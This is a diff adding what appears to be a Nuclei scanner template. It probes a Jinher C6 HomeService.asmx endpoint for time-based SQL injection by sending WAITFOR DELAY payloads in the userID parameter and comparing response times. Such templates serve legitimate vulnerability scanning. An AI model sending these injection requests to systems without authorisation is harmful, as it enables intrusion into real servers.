@@ -1,0 +1,23 @@
+id: jinher-c6-HomeService-sqli
+
+info:
+  name: jinher-c6-HomeService-sqli
+  author: msk
+  severity: high
+http:
+  - raw:
+      - |
+        GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:0%27-- HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Connection: close  
+
+      - |
+        GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1'%3b+WAITFOR%20DELAY%20%270:0:2%27-- HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Connection: close  
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - duration_2 > duration_1 && contains_all(body,'?xm','Sex','ToRead')
